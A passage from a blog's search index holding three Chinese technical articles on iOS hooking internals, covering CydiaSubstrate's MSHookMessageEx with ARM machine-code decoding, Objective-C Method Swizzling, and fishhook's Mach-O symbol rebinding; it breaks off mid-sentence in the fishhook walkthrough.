<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[Hook 原理之 CydiaSubstrate（一）：MSHookMessageEx]]></title>
      <url>https://amywushu.github.io/2017/03/07/%E9%80%86%E5%90%91%E7%9F%A5%E8%AF%86-Hook-%E5%8E%9F%E7%90%86%E4%B9%8B-CydiaSubstrate%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9AMSHookMessageEx.html</url>
      <content type="text"><![CDATA[愿麦子和麦子长在一起，愿河流与河流流归一处。 ——海子《黎明和黄昏》 前情提要CydiaSubstrate，作者为 Jay Freeman(saurik)，在iOS7越狱之前名为 MobileSubstrate，因此 CydiaSubstrate 框架中的大部分函数仍以 MS 为前缀。 在用 theos 开发中，control 文件中的 depend 字段依赖库为 mobilesubstrate，该工具是实现 CydiaSubstrate 注入的关键所在，整个工具主要分为 MobileHooker、MobileLoader 以及 Safe mode 三部分。 MobileHooker，是 CydiaSubstrate 的一个组件，对 C 和 Objective-C 均有效。 MobileHooker 组件主要提供了 MSHookMessageEx 和 MSHookFunction 两个函数针对不同语言的 inline hook 功能，其中 MSHookMessageEx 负责用来 hook Objective-C 函数，MSHookFunction 负责用来 hook C/C++ 函数。 ————简书作者：HWenj《iOS HOOK》 源码编译CydiaSubstrate 源代码现在已经不开源了，我调试用的代码是 iOS5 的时候的版本，GitHub。虽然已经过时很久，仅支持32位的移动端，以及32/64位的 PC 端，但其中还是有很多东西值得学习。 正如前文所说，MSHookMessageEx 是针对 OC 函数的 hook，因此它也是采用的 Method Swizzling 方法（详见我之前的文章 Hook 原理之 Method Swizzling），下面我们来分析一下老版本中的源代码。核心代码在 C++ 文件 ObjectiveC.cpp 中。 首先需要在你的工程中引入以下几个文件：ARM.hpp、x86.hpp、CydiaSubstrate.h、Debug.hpp、Debug.cpp 以及 Log.hpp，后面三个文件可以不导入，修改几处 Log 的代码即可。 然后在工程中添加一对新的 C++ 文件（即实现文件和头文件），我的命名为 MyMSHookMessageEx。 然后将 ObjectiveC.cpp 中的内容，包括引入的头文件，static Method MSFindMethod(Class _class, SEL sel) 函数，static void MSHookMessageInternal(...) 函数和 _extern void MSHookMessageEx(...) 函数拷贝到 MyMSHookMessageEx.cpp 中。 新建 Cocoa Touch Class，我的命名为 MySwizzling。在头文件中添加函数声明 - (void)exchange;。 在实现文件 MySwizzling.m 中添加以下代码： 1234567891011121314151617181920212223#import "MySwizzling.h"@implementation MySwizzlingvoid *(*oldConnect)(id self, SEL _cmd);void *newConnect(id self, SEL _cmd) &#123; NSLog(@"new connect"); return oldConnect(self, _cmd);&#125;- (void)connect_orig &#123; NSLog(@"origin connect");&#125;- (void)exchange &#123; MSHookMessageEx([self class], @selector(connect_orig), &amp;newConnect, &amp;oldConnect); [self connect_orig]; &#125;@end 6. 最后在你想测试的地方，初始化类，调用方法即可。（我是在 ViewController.m: -(void)viewDidLoad 中调用的） 源码解析MSHookMessageExMSHookMessageEx 函数就是对 MSHookMessageInternal 函数的封装，除了 prefix 参数为 NULL 之外，其余的参数都原封不动的传入。 MSHookMessageInternal先厘清一下这个核心函数的整个流程。 进入 MSHookMessageInternal 函数先是一大堆参数检查的 log， 比较清晰，就不分析了。然后调用 Method method(MSFindMethod(_class, sel)); 通过 MSFindMethod 函数获取 sel 对应的方法 method； 初始化一些值。字符指针 type 赋值为 method 的参数类型等描述。direct 赋值为 false，这个值代表着传入的参数 sel 是否为传入的参数 _class 中的方法，即是否为本类的方法。在接下来的第一个 for 循环中改变 direct 的值，这个循环就是用来判断 sel 是否是 _class 中的方法。如果不是本类的方法，执行第3步。如果是本类的方法，就跳过 if 函数，执行第4步。 如果不是本类的方法，就根据运行设备的架构（32位的arm，i386 和 x86_64）添加 class_getMethodImplementation(super,sel) 以及 执行 sel 对应的函数实现 的汇编代码，将返回值存储在 old 中。然后执行第5步。 如果是本类的方法，就跳过 if 函数，将找到的 sel 对应的方法 method 的实现 imp 赋给 old。然后执行第5步。 然后将 old 的值赋给 *result，即 oldConnect 函数指针。 如果 prefix != NULL，就给 _class 类添加一个 sel 为 prefix+sel，imp 为 old 的方法。 如果是本类的方法，执行第8步。如果不是，执行 else 分支，第9步。 direct = true，就通过 method_setImplementation 函数将传入的 newConnect 的函数地址赋给 sel 对应的方法 method 中的实现。即调用 connect_orig，会跳到 newConnect 的入口函数处。 direct = false，则通过 class_addMethod 函数将函数名为 sel，函数地址为 newConnect 函数地址，函数类型为 type 的方法添加到 _class 类中。 下面对主要部分作详细解释。 MSFindMethodMSFindMethod 函数主要是用于找到传入的参数 sel 对应的 method。 123456789101112131415161718192021static Method MSFindMethod(Class _class, SEL sel) &#123; for (; _class != nil; _class = class_getSuperclass(_class)) &#123; unsigned int size; Method *methods(class_copyMethodList(_class, &amp;size)); if (methods == NULL) continue; for (unsigned int j(0); j != size; ++j) &#123; Method method(methods[j]); if (!sel_isEqual(method_getName(methods[j]), sel)) continue; free(methods); return method; &#125; free(methods); &#125; return nil;&#125; 主要是通过两个 for 循环，遍历参数 _class 及其父类（父类的父类…直到基类），通过函数 class_copyMethodList 取得 _class 的方法列表，通过第二个 for 循环来遍历方法列表，与 sel 字符串作比较，如果匹配成功，即找到 sel 对应的方法，返回该 method，否则一直遍历，直到最后返回 nil。 这份源代码中，作者在使用 C++ 语言的初始化时，多用括号。如 int j = 0; 作者常使用 int j(0); if (!direct)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 if (!direct) &#123;#if defined(__arm__) size_t length(11 * sizeof(uint32_t));#elif defined(__i386__) size_t length(20);#elif defined(__x86_64__) size_t length(50);#endif uint32_t *buffer(reinterpret_cast&lt;uint32_t *&gt;(mmap( NULL, length, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0 ))); if (buffer == MAP_FAILED) MSLog(MSLogLevelError, "MS:Error:mmap() = %d", errno); else if (false) fail: munmap(buffer, length); else &#123; Class super(class_getSuperclass(_class));#if defined(__arm__) buffer[ 0] = A$stmdb_sp$_$rs$((1 &lt;&lt; A$r0) | (1 &lt;&lt; A$r1) | (1 &lt;&lt; A$r2) | (1 &lt;&lt; A$r3) | (1 &lt;&lt; A$lr)); buffer[ 1] = A$ldr_rd_$rn_im$(A$r0, A$pc, ( 8 - 1 - 2) * 4); buffer[ 2] = A$ldr_rd_$rn_im$(A$r1, A$pc, ( 9 - 2 - 2) * 4); buffer[ 3] = A$ldr_rd_$rn_im$(A$lr, A$pc, (10 - 3 - 2) * 4); buffer[ 4] = A$blx_rm(A$lr); buffer[ 5] = A$str_rd_$rn_im$(A$r0, A$sp, -4); buffer[ 6] = A$ldmia_sp$_$rs$((1 &lt;&lt; A$r0) | (1 &lt;&lt; A$r1) | (1 &lt;&lt; A$r2) | (1 &lt;&lt; A$r3) | (1 &lt;&lt; A$lr)); buffer[ 7] = A$ldr_rd_$rn_im$(A$pc, A$sp, -4 - (5 * 4)); buffer[ 8] = reinterpret_cast&lt;uint32_t&gt;(super); buffer[ 9] = reinterpret_cast&lt;uint32_t&gt;(sel); buffer[10] = reinterpret_cast&lt;uint32_t&gt;(&amp;class_getMethodImplementation);#elif defined(__i386__) ......#elif defined(__x86_64__) ......#endif if (mprotect(buffer, length, PROT_READ | PROT_EXEC) == -1) &#123; ...... &#125; old = reinterpret_cast&lt;IMP&gt;(buffer); if (MSDebug) &#123; ...... &#125; &#125; &#125; 前两句代码比较容易理解，给 length 分配大小，然后给 buffer 分配内存，以4个字节为单位分配11个可读写的内存。然后将 super 赋值为 _class 的父类。 接下来这一部分涉及到汇编和机器码的对应问题，后面的讲解主要以32位的 arm 为例，i386 和 x86_64 都跟它差不多，比它要更简单一点。 推荐官方手册：ARM Architecture Reference Manual。非常详细和权威的参考资料。 汇编语言对应着不同的机器语言指令集。一种汇编语言专用于某种计算机系统结构，而不像高级语言，可以在不同系统平台间移植。CPU 处理的时候实际上是处理的机器语言，也就是我们常说的机器码。由汇编器负责汇编语言到机器语言的转换。 上图为与汇编语言相对应的通用的机器码格式。cond 为条件码，如 EQ(EQual to 0)、NE(Not Equal to 0)、CS(Carry Set)等等，如果是无条件，则为 AL(ALways)，对应的机器码为1110。 26~27位是保留位。 I 位，也就是第25位，是用来表明 shifter_operand 段存放的类型。0表示寄存器，1表示立即数。 24~21位是 opcode，表明指令的类型。如 AND 为0000，SUB 为0010，MOV 为1101等等。 S 位，第20位，表明是否影响 cpsr（程序状态寄存器），有则置1，否则置0。 19~16位是指 Rn 寄存器，也就是第一个源操作数寄存器，根据每个指令的格式，有的指令有 Rn，有的没有。 15~12位是指 Rd 寄存器，即目的寄存器，存放操作后的数据。 11~0位标明第二个源操作数，若为立即数则填该立即数的二进制值，若为通用寄存器则填通用寄存器标号的二进制值。另外根据不同的指令，这一字段会有不同的具体划分，可查阅官方手册。 根据 ARM.hpp 头文件中的宏定义，来具体分析这几句汇编代码。以第一句A$stmdb_sp$_$rs$(...) 为例，在头文件中的定义为： 123456789101112enum A$r &#123; A$r0, A$r1, A$r2, A$r3, A$r4, A$r5, A$r6, A$r7, A$r8, A$r9, A$r10, A$r11, A$r12, A$r13, A$r14, A$r15, A$sp = A$r13, A$lr = A$r14, A$pc = A$r15&#125;;#define A$stmdb_sp$_$rs$(rs) /* stmdb sp!, &#123;rs&#125; */ \ (0xe9200000 | (A$sp &lt;&lt; 16) | (rs)) 0xe920000 的二进制数为1110 10 0 1001 0 000000000000，即无条件，操作指令为1001，0~19的字段通过按位或来填充。首先 A$sp 左移16位，A$sp = A$r13 = 13 = 1101，左移16位，即填充至19~16位，Rn 寄存器的位置，0~15的字段由 rs 填充。 第一句 buffer[ 0] = A$stmdb_sp$_$rs$((1 &lt;&lt; A$r0) | (1 &lt;&lt; A$r1) | (1 &lt;&lt; A$r2) | (1 &lt;&lt; A$r3) | (1 &lt;&lt; A$lr)); 即1左移0位，1左移1位，1左移2位，1左移3位，1左移14位，按位或之后为：1110 10 0 1001 0 1101 0100 0000 0000 1111。官方手册上关于 stmdb 的格式是这样的： 其中 registers 的解释为： 上面的代码执行后，在第0、1、2、3、14位均为1，也就是代表了 r0、r1、r2、r3、lr 寄存器。因此我们将机器码整理为汇编语言，即为 stmdb sp! {r0~r3,lr}。 将后面的几句依次整理为汇编语言： 即为 stmdb sp! {r0~r3, lr} ldr r0, [pc, #0x14] ldr r1, [pc, #0x14] ldr r2, [pc, #0x14] blx lr str r0, [sp, #-0x4] ldia sp!, {r0~r3, lr} ldr pc, [sp, #-0x18] 我们在 newConnect 函数的末尾 return oldConnect(self, _cmd) 处下一个断点，然后在控制台输入几次 si 命令，即可看到增加的这几行汇编代码与我们分析的一样，如下图： 那么这几行汇编代码是什么意思呢？第1行，是将 r0~r3，以及 lr 寄存器推入栈中，即保存现在的状态。 第2、3、4行，将 pc+0x14 处的数值存入 r0、r1、lr 寄存器。这几行汇编指令都是以机器码的形式写入 buffer 中的，buffer[0]~buffer[7] 保存了这8条指令。buffer[ 8] = reinterpret_cast&lt;uint32_t&gt;(super); 即保存的是 super （_class 父类）的值，buffer[9] 保存的是 sel 的值，buffer[10] 保存的是 class_getMethodImplementation 的地址。 有关 pc 的计算。 PC 值（program counter）表示下一条指令存储的地址。由于 ARM 采用流水线来提高 CPU 利用效率，无论是 ARM7 的3级流水线还是 ARM9 的5级流水线，如果当前指令在执行，那么下一条指令一定正在译码，再下一条指令正在读取。 因此 PC 值实际上指的是当前执行指令的下一条的再一下条指令。 第5行，跳到 lr 寄存器中的地址处，执行指令代码，即 buffer[10]，class_getMethodImplementation 函数，它的参数为 r0,r1。那么，也就是执行 class_getMethodImplementation(super, sel)； 第6行，lr 寄存器存储的地址中的代码执行完毕后，将返回值 r0 寄存器中的值保存到栈中，即 sp-0x4 中，然后 sp = sp -0x4。也就是说在栈中保存了 sel 对应的 imp 值。 第7行，将 r0~r3，以及 lr 寄存器推出栈，恢复之前的状态。 第8行，将 pc 指向 sp-0x18 处的值。因为第7行指令执行完之后，sp 的值也恢复到第1条指令执行之前的状态，所以需要 sp-0x18 来找到再第6条指令处保存的返回值，并执行。（有关 ARM 中栈以及 SP 的操作，可以参考我之前的文章 栈·参数存储排布） 因此整个汇编代码做的事情实际上就是前面在流程中提到的，根据运行设备的架构（32位的arm，i386 和 x86_64）来执行方法调用class_getMethodImplementation(super,sel)，以及执行这个方法返回的 imp。 class_getMethodImplementation 函数内部会调用 lookUpImpOrNil 函数，这个函数接着又会调用 lookUpImpOrForward 函数。 而 lookUpImpOrForward 正是 objc_msgSend 消息函数在没有缓存的时候，将会执行的函数。因此 class_getMethodImplementation 函数寻找对应的 imp 的流程跟无 cache 发送消息的流程是一样的，会往上寻找父类的方法列表，一直到基类的方法列表，找不到再进行消息转发等等。（具体内容可以参考我之前的文章 通过汇编解读 objc_msgSend） 最后是将 buffer 的地址赋给 old，这样，在执行 connect_orig 时，就会跳到 buffer[0] 处执行那几条汇编代码，找到 sel 对应的 imp 并执行。 if (prefix!=NULL)这一部分比起上一部分来说就简单多了。 123456789101112if (prefix != NULL) &#123; const char *name(sel_getName(sel)); size_t namelen(strlen(name)); size_t fixlen(strlen(prefix)); char *newname(reinterpret_cast&lt;char *&gt;(alloca(fixlen + namelen + 1))); memcpy(newname, prefix, fixlen); memcpy(newname + fixlen, name, namelen + 1); if (!class_addMethod(_class, sel_registerName(newname), old, type)) MSLog(MSLogLevelError, "MS:Error: failed to rename [%s %s]", class_getName(_class), name); &#125; 总体来说，就是给传入的参数 sel 字符串加上前缀 prefix，然后将 old 作为 prefix+sel 的实现，type 作为它的函数类型，将这个 method 加入 _class 的方法列表。 比如 prefix = “xxx”，sel = @selector(connect_orig)。执行了这段代码之后，只需要在头文件中声明 - (void)xxxconnect_orig; 不用在 .m 文件中实现，直接调用 [self xxxconnect_orig]; 就会执行原来的 connect_orig 代码。 总结关于 if (!direct) 这个分支，总的来说就是: 如果 direct == true，这个 sel 是本类的方法，就执行old = method_getImplementation(method);method_setImplementation(method, imp); 如果 direct == false，不是本类的方法，就执行old = class_getMethodImplementation(super, sel);class_addMethod(_class, sel, imp, type); 执行 class_addMethod 这个方法，主要是为了避免使用 method_setImplementation 覆盖父类已有的函数，所以在本类中动态添加了这个方法。 另外，在 objc/runtime.h 中提到： @note \c class_getMethodImplementation may be faster than \cmethod_getImplementation(class_getInstanceMethod(cls, name)). 在我的测试中，就算没有 if (!direct) 那一段代码，程序依然可以找到父类的 sel 执行 hook 操作，所以不太懂作者为什么要加这样一段机器码，此点存疑。如果大家什么想法，欢迎与我交流，amywushu@gmail.com。 Reference[1] ARM机器码分析 http://www.mamicode.com/info-detail-893760.html[2] 3.Arm机器码 http://www.cnblogs.com/FORFISH/p/4199600.html[3] C++标准转换运算符reinterpret_cast http://www.cnblogs.com/ider/archive/2011/07/30/cpp_cast_operator_part3.html 声明: 本文转载需标明出处，禁止用于商业目的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hook 原理之 Method Swizzling]]></title>
      <url>https://amywushu.github.io/2017/03/01/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-Hook-%E5%8E%9F%E7%90%86%E4%B9%8B-Method-Swizzling.html</url>
      <content type="text"><![CDATA[世间所有仇与怨的消弭，大抵一边靠忘，一边靠将心比心吧。 ——priest《杀破狼》 基础知识提要Method Swizzling 其实就是利用了 runtime 机制，替换了调用的方法（method）的实现（imp）。很多人一看到有 runtime 就头疼了，跟 runloop 一样，由于被太多大牛提起，反而心生胆怯，觉得是一个很难理解的机制。 runtime 运行时机制，主要是在 OC 和 C 语言（或汇编语言）之间架了一座桥梁。比如我之前的文章 通过汇编解读 objc_msgSend 中提到的调用方法的本质是发送消息。方法调用是 OC 中的，而消息发送，找到方法的入口则是 C （或汇编）中的。这其中转换的过程，就是 runtime。 runtime 是一个使用 C 语言以及汇编写的动态库。它封装了一些 C 语言的结构体和函数，这些函数可以让使用者在运行时创建、查看、修改类，对象以及方法等。同时也执行着较为底层的传递消息，寻找方法的执行代码的操作。 在使用 runtime 时，一般需要引入 &lt;objc/runtime.h&gt; 头文件。 实现原理Method Swizzling，正如之前所提到的，本质就是替换了方法的实现。在 OC 中调用一个方法，这个方法的本质是一条消息，而这条消息的本质，就是一个 selector。也就是说 selector 就代表着这个方法，比如在程序中，我们经常会使用 @selector() 这样的方式来调用另一个方法。 每个类都存储着一个方法列表，又叫调度表（dispatch table），这个表是 selector 与方法的具体实现 IMP 的对应关系，类似于函数名和函数指针。IMP 指向的是方法的具体实现。 交换两个方法的实现。也就是说你调用方法 A，但其实是跳到方法 B 的执行代码中。 修改调用方法的类，那么调用 A 类的方法1，其实是调用 B 类的方法1。 直接设置某个方法的 IMP，那么调用这个方法时，也就直接跳到另外一个 IMP 处了。…… 总而言之，都是替换了 selector 对应的 IMP。这就是 Method Swizzling 所做的事情。 上面两张图均来自念茜的博客。 概念区分： Selector（typedef struct objc_selector *SEL）:在运行时 Selector 用来代表一个方法的名字。Selector 是一个在运行时被注册（或映射）的C类型字符串。 Selector 由编译器产生并且在当类被加载进内存时由运行时自动进行名字和实现的映射。 Method（typedef struct objc_method *Method）:方法是一个不透明的用来代表一个方法的定义的类型。 相当于 SEL + IMP 。 Implementation（typedef id (*IMP)(id, SEL,…)）:这个数据类型指向一个方法的实现的最开始的地方。该方法的第一个参数指向调用方法的自身（即内存中类的实例对象，若是调用类方法，该指针则是指向元类对象 metaclass）。第二个参数是这个方法的名字 selector，该方法的真正参数紧随其后。 常用方法 通过 SEL 获取一个方法 MethodMethod class_getInstanceMethod(Class cls, SEL name); 通过 Method 获取该方法的实现 IMPIMP method_getImplementation(Method m); 返回一个字符串，描述了方法的参数和返回类型const char * method_getTypeEncoding(Method m); 通过 SEL 以及 IMP 给一个类添加新的方法 Method，其中 types 就是 method_getTypeEncoding 的返回值。BOOL class_addMethod(Class cls, SEL name, IMP imp, const char *types); 通过给定的 SEL 替换同一个类中的方法的实现 IMP，其中 SEL 是想要替换的 selector 名，IMP 是替换后的实现。IMP class_replaceMethod(Class cls, SEL name, IMP imp, const char *types); 交换两个方法的实现 IMPvoid method_exchangeImplementations(Method m1, Method m2); class_replaceMethod、method_exchangeImplementations 这两个方法的不同之处在于，前者只是将方法 A 的实现替换为方法 B 的实现，而方法 B 的实现并没有改变。后者则是交换了两个方法的实现。 示例Methode Swizzling 有一个常用场景：我想给 app 中每个视图控制器的 viewDidAppear: 方法中添加 log。无论是简单粗暴的给所有视图控制器添加代码，还是通过继承的方式，都会有大量的重复代码出现。 我们可以考虑一种新的方式：在 category 中实现 method swizzling。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#import &lt;objc/runtime.h&gt;@implementation UIViewController (Tracking)+ (void)load &#123; static dispatch_once_t onceToken; dispatch_once(&amp;onceToken, ^&#123; Class class = [self class]; // 取得 SEL SEL originalSelector = @selector(viewWillAppear:); SEL swizzledSelector = @selector(xxx_viewWillAppear:); // 取得 Method （对象方法） Method originalMethod = class_getInstanceMethod(class, originalSelector); Method swizzledMethod = class_getInstanceMethod(class, swizzledSelector); // 如果是类方法的话，使用下面的代码 // Class class = object_getClass((id)self); // ... // Method originalMethod = class_getClassMethod(class, originalSelector); // Method swizzledMethod = class_getClassMethod(class, swizzledSelector); BOOL didAddMethod = class_addMethod(class, originalSelector, method_getImplementation(swizzledMethod), method_getTypeEncoding(swizzledMethod)); if (didAddMethod) &#123; class_replaceMethod(class, swizzledSelector, method_getImplementation(originalMethod), method_getTypeEncoding(originalMethod)); &#125; else &#123; method_exchangeImplementations(originalMethod, swizzledMethod); &#125; &#125;);&#125;#pragma mark - Method Swizzling- (void)xxx_viewWillAppear:(BOOL)animated &#123; [self xxx_viewWillAppear:animated]; NSLog(@"viewWillAppear: %@", self);&#125;@end 上面的代码中， class_addMethod 方法只是为了作一个判断，检测 self 是否已经有了 originalSelector 方法。如果没有这个方法，就会添加一个 SEL 为 originalSelector 的方法，并将 swizzledSelector 的实现赋给它。接着会进入 if (didAddMethod) 分支。 这里有一个值得注意的地方，就是如果在 self 中没有实现这个方法，而父类中有实现，那么在 if (didAddMethod) 分支中，其实是将父类的 originalSelector 的实现赋给 swizzledSelector，也就是说会调用父类的方法。 如果父类也没有实现，消息转发也找不到这个方法，那么才是调用之前添加进入 class 的 originalSelector。结果就是 originalSelector 和 swizzledSelector 的实现均为 xxx_viewWillAppear: 。 如果 self 中已经有了这个方法，那么 class_addMethod 方法就会失败，直接进入 else 分支交换 IMP。 一个容易让人疑惑的点是：在 xxx_viewWillAppear: 的方法内部又调用了 [self xxx_viewWillAppear:animated]; 这是因为两个方法的 IMP 已经被调换，这里其实是调用原来的 viewWillAppear: 方法的实现。 在这个例子中，虽然可以不用 Method Swizzling 方法，直接在 category 中重写 viewWillAppear: 方法也能达到目的。但是前者可以控制执行的顺序，以及可以用在非系统类中。而 category 中的方法是直接覆盖了原来的方法的，调用顺序是既定的，且只能用在系统类中。 注意事项+load一般来说，Method Swizzling 应该只在 +load 方法中完成。 在 Objective-C 的运行时中，每个类都会自动调用两个方法。+load 是在一个类被初始装载时调用的，+initialize 是在应用第一次调用该类的类方法或实例方法前调用的。在应用程序的一开始就调用执行，是最安全的，避免了很多并发、异常等问题。如果在 +initialize 初始化方法中调用，runtime 很可能死于一个诡异的状态。 dispatch_once由于 swizzling 改变了全局的状态，所以需要确保在运行时，我们采用的预防措施是可用的。原子操作就是这样一个用于确保代码只会被执行一次的预防措施，就算是在不同的线程中也能确保代码只执行一次。Grand Central Dispatch 的 dispatch_once 满足了这些需求，所以，Method Swizzling 应该在 dispatch_once 中完成。 调用原始实现由于很多内部实现对我们来说是不可见的，使用方法交换可能会导致代码结构的改变，而对程序产生其他影响，因此应该调用原始实现来保证内部操作的正常运行。 注意命名这也是方法命名的规则，给需要转换的方法加前缀，以区别于原生方法。 类簇Method Swizzling对NSArray、NSMutableArray、NSDictionary、NSMutableDictionary 等这些类簇是不起作用的。因为这些类簇类，其实是一种抽象工厂的设计模式。抽象工厂内部有很多其它继承自当前类簇的子类，抽象工厂类会根据不同情况，创建不同的抽象对象来进行使用，真正执行操作的并不是类簇本身。 那么要使它有作用，就需要使用类簇里面的真正的类，比如 objc_getClass(&quot;__NSArrayI&quot;) 类簇 常用子类 NSArray __NSArrayI NSMutableArray __NSArrayM NSDictionary __NSDictionaryI NSMutableDictionary __NSDictionaryM Reference[1] iOS黑魔法－Method Swizzling http://www.jianshu.com/p/ff19c04b34d0[2] iOS runtime实战应用：Method Swizzling http://www.jianshu.com/p/3efc3e94b14c[3] 黑魔法 - Method Swizzling http://nucleardev.com/Method-Swizzling/[4] Method Swizzling http://nshipster.cn/method-swizzling/ 声明: 本文转载需标明出处，禁止用于商业目的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Hook 原理之 fishhook 源码解析]]></title>
      <url>https://amywushu.github.io/2017/02/27/%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0-Hook-%E5%8E%9F%E7%90%86%E4%B9%8B-fishhook-%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90.html</url>
      <content type="text"><![CDATA[数以万计的人类同时发出各不相干的呻吟，有人晾晒爱有人直播死，有人挥洒热泪，有人披露奸情，你跟你的情人们相互拉黑，下一秒钟就在偷偷搜索他的名字，屏气凝神，像一个听壁脚的贼。那些从字里行间拧出来的体液、唾沫、眼泪……蒸腾而上，汇聚成文明史至今最大的一场蜃楼。 ——逃亡者的恰恰 《低俗小说》 基础知识提要各种表在 Mach-O 文件中，是位于 Section 数据之后的一些记录数据。下面介绍本文会用到的几个表。 懒加载（lazy load），又叫做延迟加载。也就说在实际需要使用该符号（或资源）的时候，该符号才会通过 dyld 中的 dyld_stub_binder 过程来进行加载。与之相对的是非懒加载（non-lazy load），这些符号在动态链接库绑定的时候，就会被加载。 在 Mach-O 中，相对应的就是 _nl_symbol_ptr 和 _la_symbol_ptr。这两个指针表，保存着与字符串表对应的函数指针。 Dynamic Symbol Table(Indirect Symbols): 动态符号表是加载动态库时导出的函数表，是符号表的 subset。动态符号表的符号 = 该符号在原所属表指针中的偏移量（offset）+ 原所属表在动态符号表中的偏移量 + 动态符号表的基地址（base）。在动态表中查找到的这个符号的值又等于该符号在 symtab 中的 offset。 Symbol Table（以下简称为 symtab）: 即符号表。每个目标文件都有自己的符号表，记录了符号的映射。在 Mach-O 中，符号表是由结构体 n_list 构成。 12345678910111213141516171819202122232425struct nlist &#123; union &#123;#ifndef __LP64__ char *n_name; /* for use when in-core */#endif uint32_t n_strx; /* index into the string table */ &#125; n_un; uint8_t n_type; /* type flag, see below */ uint8_t n_sect; /* section number or NO_SECT */ int16_t n_desc; /* see &lt;mach-o/stab.h&gt; */ uint32_t n_value; /* value of this symbol (or stab offset) */&#125;;/* * This is the symbol table entry structure for 64-bit architectures. */struct nlist_64 &#123; union &#123; uint32_t n_strx; /* index into the string table */ &#125; n_un; uint8_t n_type; /* type flag, see below */ uint8_t n_sect; /* section number or NO_SECT */ uint16_t n_desc; /* see &lt;mach-o/stab.h&gt; */ uint64_t n_value; /* value of this symbol (or stab offset) */&#125;; 以上为 n_list 的结构。通过在动态符号表中找的偏移，再加上符号表的基址，就可以找到这个符号的 n_list，其中 n_strx 的值代表该字符串在 strtab 中的偏移量（offset）。关于 n_list 的具体结构解析详见 nlist-Mach-O文件重定向信息数据结构分析 String Table（以下简称为 strtab）: 是放置 Section 名、变量名、符号名的字符串表，字符串末尾自带的 \0 为分隔符（机器码00）。知道 strtab 的基地址（base），然后加上在 Symbol Table 中找到的该字符串的偏移量（offset）就可以找到这个字符串。 fishhook 概述fishhook 是 facehook 开源的重绑定 Mach-O 符号的库，用来 hook C 语言函数（即只能重绑定 C 符号）。主要原因在于只针对 C 语言做了符号修饰。 基本思路为： 先找到 Mach-O 文件的 Load_Commands 中的 LC_SEGMENT_64(_DATA)，然后找到这条加载指令下的 Section64 Header(_nl_symbol_ptr)，以及 Section64 Header(_la_symbol_ptr)； 其中 Section Header 字段的 reserved1 的值即为该 Section 在 Dynamic Symbol Table 中的 offset。然后通过定位到该 Section 的数据，找到目标符号在 Section 中的偏移量，与之前的 offset 相加，即为在动态符号表中的偏移； 通过 Indirect Symbols 对应的数值，找到在 symtab 中的偏移，然后取出 n_list-&gt;n_un-&gt;n_strx 的值； 通过这个值找到在 strtab 中的偏移，得到该字符串，进行匹配置换。 源码解析fishhook 的源文件很少，只有一个 .h 头文件和一个 .c 文件，其中 fishhook.h 文件只暴露出了两个函数接口和一个结构体。 12345678910111213141516/* * A structure representing a particular intended rebinding from a symbol * name to its replacement */struct rebinding &#123; const char *name; void *replacement; void **replaced;&#125;;int rebind_symbols(struct rebinding rebindings[], size_t rebindings_nel);int rebind_symbols_image(void *header, intptr_t slide, struct rebinding rebindings[], size_t rebindings_nel); rebind_symbols 函数以 ReadMe 中的示例为例，先是声明与将要被 hook 的函数签名相同的函数指针，接着自定义了替换后的函数，my_close、my_open。然后在 main 函数中调用 rebind_symbols 函数。 1rebind_symbols((struct rebinding[2])&#123;&#123;"close", my_close, (void *)&amp;orig_close&#125;, &#123;"open", my_open, (void *)&amp;orig_open&#125;&#125;, 2); 在传递的参数中定义了一个结构体数组，传递了两个 rebinding 结构体，以及数组的个数2。 123456789101112131415161718192021static struct rebindings_entry *_rebindings_head;......int rebind_symbols(struct rebinding rebindings[], size_t rebindings_nel) &#123; int retval = prepend_rebindings(&amp;_rebindings_head, rebindings, rebindings_nel); if (retval &lt; 0) &#123; return retval; &#125; // If this was the first call, register callback for image additions (which is also invoked for // existing images, otherwise, just run on existing images if (!_rebindings_head-&gt;next) &#123; _dyld_register_func_for_add_image(_rebind_symbols_for_image); &#125; else &#123; uint32_t c = _dyld_image_count(); for (uint32_t i = 0; i &lt; c; i++) &#123; _rebind_symbols_for_image(_dyld_get_image_header(i), _dyld_get_image_vmaddr_slide(i)); &#125; &#125; return retval;&#125; 在 rebind_symbols 函数中，首先调用了 prepend_rebindings 函数，传入了 rebindings_head 的二级指针， rebind_symbols 函数参数中的 rebindings 数组，以及数组个数。然后将这个函数的返回值作为整个函数的返回值。 如果这个函数返回值&gt;0，且 _rebindings_head-&gt;next 的值为空（其具体含义在 prepend_rebindings 函数中讲），则调用_dyld_register_func_for_add_image 来注册回调函数 _rebind_symbols_for_image。 在 dyld 加载镜像（即 image，在 Mach-O 中，所有的可执行文件、dylib、Bundle 都是 image）的时候，会执行注册过的回调函数。这一步可以使用 _dyld_register_func_for_add_image 方法来注册自定义的回调函数，传入这个 image 的 mach_header 和 slide，同时也会为所有已加载的 image 执行回调。 123extern void _dyld_register_func_for_add_image( void (*func)(const struct mach_header* mh, intptr_t vmaddr_slide)); 如果 _rebindings_head-&gt;next 的值不为空，则直接调用回调函数。 prepend_rebindings 函数1234567891011121314151617181920212223242526struct rebindings_entry &#123; struct rebinding *rebindings; size_t rebindings_nel; struct rebindings_entry *next;&#125;;......static int prepend_rebindings(struct rebindings_entry **rebindings_head, struct rebinding rebindings[], size_t nel) &#123; struct rebindings_entry *new_entry = malloc(sizeof(struct rebindings_entry)); if (!new_entry) &#123; return -1; &#125; new_entry-&gt;rebindings = malloc(sizeof(struct rebinding) * nel); if (!new_entry-&gt;rebindings) &#123; free(new_entry); return -1; &#125; memcpy(new_entry-&gt;rebindings, rebindings, sizeof(struct rebinding) * nel); new_entry-&gt;rebindings_nel = nel; new_entry-&gt;next = *rebindings_head; *rebindings_head = new_entry; return 0;&#125; 这里主要是一个将 rebingdings 数组拷贝到 new_entry 结构体中，并把这个结构体添加到 _rebings_head 这个链表首部的操作。首先定义一个 rebindings_entry 类型的 new_entry 结构体，并初始化，给 new_entry 以及 new_entry-&gt;rebindings 分配内存。 然后拷贝传入的参数数组 rebindings 到 new_entry-&gt;rebindings 